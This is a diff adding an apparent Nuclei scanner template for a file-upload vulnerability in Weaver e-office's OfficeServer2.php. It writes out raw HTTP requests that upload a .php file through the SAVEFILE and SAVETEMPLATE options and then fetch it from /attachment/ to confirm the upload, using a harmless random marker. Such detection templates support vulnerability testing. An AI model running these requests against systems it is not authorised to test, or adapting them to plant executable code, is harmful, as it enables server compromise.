@@ -1,0 +1,66 @@
+id: Weaver-OfficeServer2-upload
+
+info:
+  name: 泛微e-office OfficeServer2.php 文件上传漏洞
+  author: hWeaverl
+  severity: high
+  tags: Weaver
+
+http:
+  - raw:
+      - |
+        POST /iWebOffice/OfficeServer2.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
+
+        ------WebKitFormBoundarySIELKZKzD7vQmdsO
+        Content-Disposition: form-data; name="FILENAME"
+        
+        t1epdso1t.php
+        ------WebKitFormBoundarySIELKZKzD7vQmdsO
+        Content-Disposition: form-data; name="OPTION"
+        
+        SAVEFILE
+        ------WebKitFormBoundarySIELKZKzD7vQmdsO
+        Content-Disposition: form-data; name="MsgFileBody"; filename="t1e5sd1t.png"
+        
+        {{randstr_1}}
+        ------WebKitFormBoundarySIELKZKzD7vQmdsO--
+
+      - |
+        POST /iWebOffice/OfficeServer2.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
+
+        ------WebKitFormBoundarySIELKZKzD7vQmdsO
+        Content-Disposition: form-data; name="FILENAME"
+        
+        t1epdso1t.php
+        ------WebKitFormBoundarySIELKZKzD7vQmdsO
+        Content-Disposition: form-data; name="OPTION"
+        
+        SAVETEMPLATE
+        ------WebKitFormBoundarySIELKZKzD7vQmdsO
+        Content-Disposition: form-data; name="MsgFileBody"; filename="t1e5sd1t.png"
+        
+        {{randstr_1}}
+        ------WebKitFormBoundarySIELKZKzD7vQmdsO--
+
+      - |+
+        GET /attachment/t1epdso1t.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_3
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
